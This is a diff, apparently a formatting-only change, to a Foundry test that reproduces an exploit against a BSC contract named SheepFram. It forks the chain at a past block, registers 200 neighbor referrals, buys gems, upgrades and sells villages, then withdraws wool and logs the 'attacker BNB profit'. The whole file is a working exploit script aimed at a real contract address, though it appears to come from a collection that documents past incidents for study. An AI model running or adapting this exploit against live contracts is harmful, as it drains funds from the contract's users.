@@ -10,43 +10,39 @@ import "./interface.sol";
 // @Tx
 // https://bscscan.com/tx/0x5735026e5de6d1968ab5baef0cc436cc0a3f4de4ab735335c5b1bd31fa60c582
 
-interface SheepFram{
+interface SheepFram {
     function register(address neighbor) external;
-    function addGems() payable external;
+    function addGems() external payable;
     function upgradeVillage(uint256 framId) external;
     function withdrawMoney(uint256 wool) external;
     function sellVillage() external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     SheepFram sheepFram = SheepFram(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
     address neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
     function setUp() public {
-        cheats.createSelectFork("bsc", 23088156);
+        cheats.createSelectFork("bsc", 23_088_156);
     }
 
-    function testExploit() public payable{
-        for(uint8 i = 0; i < 200; i++){
+    function testExploit() public payable {
+        for (uint8 i = 0; i < 200; i++) {
             sheepFram.register(neighbor);
         }
         sheepFram.addGems{value: 5 * 1e14}();
-        for(uint8 i = 0; i < 3; i++){
+        for (uint8 i = 0; i < 3; i++) {
             sheepFram.upgradeVillage(i);
         }
         sheepFram.sellVillage();
-        uint BalanceBefore = address(this).balance;
+        uint256 BalanceBefore = address(this).balance;
         sheepFram.withdrawMoney(20_000);
-        uint BalanceAfter = address(this).balance;
+        uint256 BalanceAfter = address(this).balance;
 
-        emit log_named_decimal_uint(
-            "Attacker BNB profit after exploit",
-            (BalanceAfter - BalanceBefore),
-            18
-        );
-
+        emit log_named_decimal_uint("Attacker BNB profit after exploit", (BalanceAfter - BalanceBefore), 18);
     }
 
-    receive() payable external{}
+    receive() external payable {}
 }
